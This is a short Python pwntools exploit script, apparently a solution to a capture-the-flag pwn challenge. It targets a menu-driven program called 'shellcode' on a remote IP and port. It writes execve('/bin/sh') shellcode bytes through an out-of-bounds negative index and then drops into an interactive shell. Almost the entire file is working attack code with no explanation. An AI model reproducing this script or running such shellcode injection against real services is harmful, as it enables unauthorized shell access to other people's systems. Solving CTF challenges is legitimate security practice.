from pwn import *

if len(sys.argv) > 1:
	sh =remote("128.199.104.41",23170)
else:
	sh=process("./shellcode")

def a(p):
	gdb.attach(p,"""
		""")

def create(index,size,data):
	sh.sendlineafter("ce:","1")
	sh.sendlineafter("dex:",str(index))
	# sh.interactive()
	sh.sendlineafter("ze:",str(size))
	sh.sendlineafter("ata:",str(data))

def delete(index):
	sh.sendlineafter("ce:","2")
	sh.sendlineafter("dex:",str(index))

# shell=b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
shell="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
# http://shell-storm.org/shellcode/files/shellcode-806.php

create(-10,len(shell)+16,shell)
sh.sendlineafter("ce:","1")
# sh.sendlineafter("dex:",str(p64(0)))
a(sh)
sh.interactive()